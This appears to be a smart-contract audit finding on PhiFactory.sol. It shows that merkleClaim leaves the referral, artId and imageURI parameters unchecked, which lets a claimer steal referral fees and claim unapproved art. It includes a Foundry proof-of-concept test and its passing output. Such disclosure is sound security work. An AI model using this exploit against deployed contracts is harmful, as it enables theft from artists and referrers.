## [M] Lack of data validation when users are claiming their art allows malicious user to bypass signature/merkle hash to provide unapproved `ref_`, `artId_` and `imageURI`

In the file `PhiFactory.sol`, the lack of checks in `merkleClaim` allows malicious users to bypass the hash check to pass in their own parameter of choice. The 3 variables that could possibly be manipulated (`referral`, `artId` and `imageURI`) and their impact will be each discussed below.

### Missing `ref_` and `artId_` in validation.

As we can see in [`merkleClaim`](relative_path_091409:src/PhiFactory.sol#L362-L375), `address ref_` and `uint256 artId_` is decoded from `encodeData_` which is simply a bytes data type passed into the function parameter by the user.

```solidity
  (address minter_, address ref_, uint256 artId_) = abi.decode(encodeData_, (address, address, uint256));
  PhiArt storage art = arts[artId_];
  ......
  if (
      !MerkleProofLib.verifyCalldata(
          proof_, credMerkleRootHash, keccak256(bytes.concat(keccak256(abi.encode(minter_, leafPart_))))
      )
  ) {
      revert InvalidMerkleProof();
  }
  ......
```

Observing the line where the merkle hash is cross-checked:

```solidity
!MerkleProofLib.verifyCalldata( proof_, credMerkleRootHash, keccak256(bytes.concat(keccak256(abi.encode(minter_, leafPart_)))) )
```

It becomes clear that **only** `minter_` from `encodeData_` is checked, leaving `ref_` and `artId_` to whatever values passed by the user.

By the way, **both** `ref_` and `artId_` are **explicitly checked in the `signatureClaim` function**:

```solidity
function signatureClaim(.....) external payable whenNotPaused {
  (uint256 expiresIn_, address minter_, address ref_, address verifier_, uint256 artId_,, bytes32 data_) =
      abi.decode(encodeData_, (uint256, address, address, address, uint256, uint256, bytes32));
      
  if (expiresIn_ <= block.timestamp) revert SignatureExpired();
  if (_recoverSigner(keccak256(encodeData_), signature_) != phiSignerAddress) revert AddressNotSigned();
  .....
}
```

Hence, to forge `ref_` and `artId_`, malicious users will have to use `merkleClaim` instead of `signatureClaim`.

**Impact of forging `ref_`**

- Malicious users can pass in their own other account address as `ref_`, successfully stealing the referral fee from the real `ref_` or the artist(who will receive the referral fee if `ref_` is set to null).
- Suppose Alice has 2 accounts, when she calls `merkleClaim` to claim on `account 1`, she can pass in `account 2` as the `ref_` to illegally steal the referral fees to offset the cost of minting.
- The reason why Alice has to pass in `account 2` instead of `account 1` as the `ref_` is because in `PhiRewards.sol`'s `depositRewards`, referral has to be different from minter address in order for Alice to receive the referral fees.

**Impact of forging `artId_`**

- Unlike `signatureClaim` which checks `artId_` explicitly, `merkleClaim` only verifies `minter_` and `leafPart_` to the credId's merkle root hash.
- Since a Cred can have multiple art linked to it, this becomes a problem.
- Suppose `Cred A` has `Art 1` and `Art 2`.
- Now, Alice got approval to claim `Art 1`.
- If the art's verification type was set to "SIGNATURE" and Alice had to call `signatureClaim`, Alice would **only** be able to claim `Art 1` with that approval signature.
- However if the art's verification type was "MERKLE" instead, when she calls `merkleClaim`, she will be able to claim `Art 2` with only approval for `Art 1` by passing the `artId_` of `Art 2`.

### Missing `imageURI` in validation

We can see in both `signatureClaim` [Line 330](relative_path_091409:src/PhiFactory.sol#L330) and `merkleClaim` [Line 355](relative_path_091409:src/PhiFactory.sol#L355), `imageURI` is passed into the function parameter rather than extracted from the signature and is not involved in the merkle hash check as well.

Since `imageURI` contains important information about the art details (such as location/directory). This could have a severe impact. When the malicious user is trying to claim an art that he has permission to, he could pass in an `imageURI` with the location directory of the picture image file pointing to another art which he does not have permission for.

The line `advancedTokenURI[tokenId_][to_] = imageURI_;` in `PhiNFT1155.sol` will also be set to an unapproved value. This will lead to undefined/unsupported behaviours when interacting with the smart contract regarding trying to render an user's art URI.

### Proof of concept

Add this function to `test/PhiFactory.t.sol:TestPhiFactory`:

```solidity
function test_claimHack() public {
  bytes32 expectedRoot = 0xe70e719557c28ce2f2f3545d64c633728d70fbcfe6ae3db5fa01420573e0f34b;
  bytes memory credData = abi.encode(1, owner, "MERKLE", 31_337, expectedRoot);
  bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
  bytes32 createMsgHash = keccak256(signCreateData);
  bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
  (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
  if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
  phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(
      signCreateData,
      abi.encodePacked(cr, cs),
      IPhiFactory.CreateConfig(participant, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false)
  );

  address Alice = participant; //Original file setup already deals `participant` enough ether to pay for mint fees
  address Alice_2 = address(0x123456); //Alice's account 2
  vm.startPrank(Alice);

  bytes32[] memory proof = new bytes32[](2);
  proof[0] = 0x0927f012522ebd33191e00fe62c11db25288016345e12e6b63709bb618d777d4;
  proof[1] = 0xdd05ddd79adc5569806124d3c5d8151b75bc81032a0ea21d4cd74fd964947bf5;
  address to = 0x1111111111111111111111111111111111111111;
  bytes32 value = 0x0000000000000000000000000000000003c2f7086aed236c807a1b5000000000;
  uint256 artId = 1;
  bytes memory data = abi.encode(artId, to, proof, Alice_2, uint256(1), value, IMAGE_URL2); // Within this line we have the freedom to decide artId, address of referral and the image URL

  bytes memory dataCompressed = LibZip.cdCompress(data);
  uint256 totalMintFee = phiFactory.getArtMintFee(artId, 1);


  phiFactory.claim{ value: totalMintFee }(dataCompressed);
  (, bytes memory response) = phiFactory.phiRewardsAddress().call(abi.encodeWithSignature("balanceOf(address)", Alice_2));
  uint256 balance = abi.decode(response, (uint256));
  console2.log("Alice_2: ", balance); //Alice successfully illegally receives referral fee through her second account
  vm.stopPrank();
}
```

Run `forge test --match-test test_claimHack -vv`:

```
Ran 1 test for test/PhiFactory.t.sol:TestPhiFactory
[PASS] test_claimHack() (gas: 1356967)
Logs:
  Alice_2:  50000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.83ms (4.52ms CPU time)
```

As you can see from the Code and the output, `Alice` managed to set the referral address to her second account (`Alice_2`), and received the referral reward of `0.00005 ether`; which will be a significant sum if Alice was minting high quantity of art, since rewards are calculated by `quantity_ * referralReward`

Alice also managed to **manipulate image_uri**, encoding `IMAGE_URL2` instead of `IMAGE_URL` into the function parameter. Both `IMAGE_URL2` and `IMAGE_URL` are different variables which are already declared in the original foundry test file.



